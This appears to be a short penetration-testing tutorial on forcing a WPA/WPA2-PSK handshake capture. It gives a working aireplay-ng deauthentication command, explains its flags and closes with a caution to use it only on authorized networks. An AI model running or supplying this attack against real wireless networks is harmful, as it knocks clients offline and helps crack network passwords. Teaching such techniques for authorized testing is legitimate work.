WPA/WPA2 Exploitation

Forcing the WPA/WPA2-PSK Handshake

Using deauthentication attacks with aireplay-ng.

Deauthentication Frames

aireplay-ng sends forged deauthentication frames to a client, causing it to disconnect from the Access Point (AP).

Triggering Reauthentication

Upon disconnection, the client automatically attempts to reauthenticate with the AP, initiating the 4-way handshake for capture.

Key Takeaway

Deauthentication attacks are an active method to force a WPA/WPA2-PSK handshake capture, significantly speeding up the exploitation process.

# Force handshake with deauthentication attack
sudo aireplay-ng --deauth 0 -a 11:22:33:44:55:66 -c AA:BB:CC:DD:EE:FF wlan0mon
Explanation:
  • --deauth 0: Sends continuous deauthentication frames (use a small number like 1 or 5 for a single burst).
  • -a 11:22:33:44:55:66: The BSSID of the target AP.
  • -c AA:BB:CC:DD:EE:FF: The MAC address of the client to deauthenticate.
  • wlan0mon: Your wireless interface in monitor mode.
Safety Note

Deauthentication attacks can cause temporary denial of service for targeted clients. Use with caution and only on authorized networks.
